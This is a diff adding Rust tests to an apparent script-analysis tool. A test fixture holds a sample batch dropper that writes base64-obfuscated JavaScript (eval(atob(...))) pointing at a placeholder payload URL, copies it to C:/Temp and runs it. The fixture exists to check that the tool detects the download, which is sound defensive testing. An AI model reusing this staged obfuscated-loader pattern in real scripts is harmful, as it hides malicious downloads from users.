@@ -10258,6 +10258,15 @@ mod tokenizer_misc_tests {
     }
 
     #[test]
+    fn command_name_keeps_drive_slash_script_path() {
+        assert_eq!(
+            command_name("C:/Temp/original.js").as_deref(),
+            Some("C:/Temp/original.js")
+        );
+        assert_eq!(command_name("set/p X=").as_deref(), Some("set"));
+    }
+
+    #[test]
     fn quoted_path_token_strips_outer_quotes() {
         assert_eq!(
             command_name(r#""C:\Temp\foo.vbs""#).as_deref(),
@@ -14491,6 +14500,24 @@ call C:\Temp\original.js"#,
                 matches!(t, crate::traits::Trait::Download { src, .. } if src == "https://copy-tracked-dir.example/payload")
             }),
             "copy to tracked directory did not preserve generated JS content: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copy_to_slash_tracked_directory_preserves_generated_script_content() {
+        let report = crate::analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vY29weS1zbGFzaC10cmFja2VkLWRpci5leGFtcGxlL3BheWxvYWQn")) > original.js
+mkdir C:/Temp
+copy /y original.js C:/Temp
+call C:/Temp/original.js"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, crate::traits::Trait::Download { src, .. } if src == "https://copy-slash-tracked-dir.example/payload")
+            }),
+            "copy to slash tracked directory did not preserve generated JS content: {:?}",
             report.traits
         );
     }
